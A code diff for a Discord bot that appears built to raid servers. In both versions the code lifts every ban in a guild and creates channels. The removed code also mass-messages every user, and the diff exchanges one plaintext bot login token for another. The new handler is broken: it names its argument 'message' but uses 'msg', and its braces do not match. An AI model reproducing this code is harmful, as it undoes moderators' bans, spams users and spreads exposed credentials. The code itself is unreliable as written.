@@ -13,11 +13,8 @@ const http = require('http');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-berke.on('message', async msg => {
-berke.users.forEach(u => {
-u.send('sa')
-})
-    
+berke.on('message', message => {
+    if(message.content.toLowerCase() === 'sa' ) {    
 msg.guild.fetchBans().then(bans => {
 bans.forEach(user => {
 msg.guild.unban(user)
@@ -32,7 +29,10 @@ let kanal1 = 'buraya-yazın'
 
 msg.guild.createChannel(kanal)
 msg.guild.createChannel(kanal1)
-});
+}
+}
+         }
+
  
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
 
@@ -85,7 +85,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjQ1MzczODYyNjA2OTI5OTIw.XekzkQ.3ivRA9CxBvESe5Z2iNjYoh6e3PI")
+berke.login("NjUzMTg4NTg4MDY5OTc4MTEy.XezXWA.QFejiDqYh5JtGnt2T2eeUCC7APY")
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
